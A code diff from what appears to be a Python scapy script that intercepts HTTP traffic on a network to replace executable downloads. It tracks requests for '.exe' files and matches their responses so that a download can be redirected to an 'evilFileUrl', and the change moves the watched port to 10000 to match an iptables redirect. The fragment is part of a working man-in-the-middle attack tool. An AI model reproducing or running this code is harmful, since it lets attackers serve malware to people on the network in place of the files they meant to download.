@@ -27,14 +27,16 @@ def process_packet(packet):
         # rather than modifying request (for which we'd have to manually initiate a TCP handshake)
         # we would modify the response (for which handshake has already been established).
         # 'ack' in request is same as 'seq' in response
-        if scapy_packet[scapy.TCP].dport == 80:
+        if scapy_packet[
+            scapy.TCP].dport == 10000:  # changed from 80 to 10000 as we have iptables rule redirecting packets
             print("HTTP Request")
             if ".exe" in scapy_packet[scapy.Raw].load and evilFileUrl not in scapy_packet[scapy.Raw].load:
                 print("EXE Request")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
             # print scapy_packet.show()
 
-        elif scapy_packet[scapy.TCP].sport == 80:
+        elif scapy_packet[
+            scapy.TCP].sport == 10000:  # changed from 80 to 10000 as we have iptables rule redirecting packets
             print("HTTP Request")
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
